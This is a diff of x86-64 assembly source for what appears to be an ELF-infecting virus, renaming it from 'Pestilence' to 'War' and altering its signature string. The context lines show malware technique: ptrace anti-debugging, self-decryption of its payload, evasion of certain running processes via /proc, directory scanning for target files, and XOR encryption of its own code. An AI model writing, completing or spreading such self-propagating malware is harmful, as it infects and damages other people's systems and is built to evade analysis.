@@ -20,7 +20,7 @@
 %define S_IFMT 0xf000
 %define SEEK_END	2
 
-%define PESTILENCE_STACK_SIZE 5000
+%define WAR_STACK_SIZE 5000
 %define DIRENT_BUFFSIZE	1024
 %define ASM_JUMP_INSTR	0xe9
 %define EHDR_SIZE 64
@@ -105,7 +105,7 @@ _start:
 	mov r9, [rsp + 8]; save program name
 	push rdx
 	push rsp
-	sub  rsp, PESTILENCE_STACK_SIZE                    ; Reserve some espace in the register r15 to store all the data needed by the program
+	sub  rsp, WAR_STACK_SIZE                    ; Reserve some espace in the register r15 to store all the data needed by the program
 	mov r15, rsp
 
 _ptrace_anti_debug:
@@ -144,7 +144,7 @@ _is_encrypted:
 	
 _decypher:
 	mov r8, 0
-	mov rdx, pestilence - _payload
+	mov rdx, war - _payload
 	xor r9, r9
 	call .get_rip
 	.get_rip:
@@ -167,9 +167,6 @@ _evade_specific_process:                                  ; cd to /proc
 	mov rax, SYS_GETUID
 	syscall
 	mov rax, SYS_CHDIR
-	syscall
-
-	mov rax, SYS_GETGID
 	syscall
 
 	cmp rax, 0
@@ -195,9 +192,6 @@ _evade_specific_process:                                  ; cd to /proc
 
 		cmp rax, 0                                     ; no more files in the directory to read
 		je _close_proc
-
-		mov rax, SYS_GETGID
-		syscall
 
 		xor r14, r14                                   ; i = 0 for the first iteration
 		mov r13, rax                                   ; r13 stores the number of read bytes with getdents
@@ -639,7 +633,7 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 				jl .nocypher
 
 				.cypher:
-					cmp r8, pestilence - _start
+					cmp r8, war - _start
 					jge .nocypher
 					xor r10,r10
 					mov r10b, byte [rsi]
@@ -745,8 +739,8 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 		mov rax, SYS_SYNC
 		syscall
 
-pestilence:
-	db 0,'Pestilence version 1.0 (c)oded by Core Contributor darodrig-rcabezas, Lord Commander of the Night', 0x27 ,'s Watch', 0x00
+war:
+	db 0,'War version 1.0 (c)oded by Core Contributor darodrig-rcabezas, Lord Commander of the Night', 0x27 ,'s Watch - ', 49,49,49,49,49,49,49,49,49,49, 0x00
 
 _close_folder:
 	mov rdi, [r15 + 16]
@@ -761,7 +755,7 @@ _tmp_test2:
 	jmp _folder_stat
 
 _end:
-	add rsp, PESTILENCE_STACK_SIZE
+	add rsp, WAR_STACK_SIZE
 	pop rsp
 	pop rdx
 
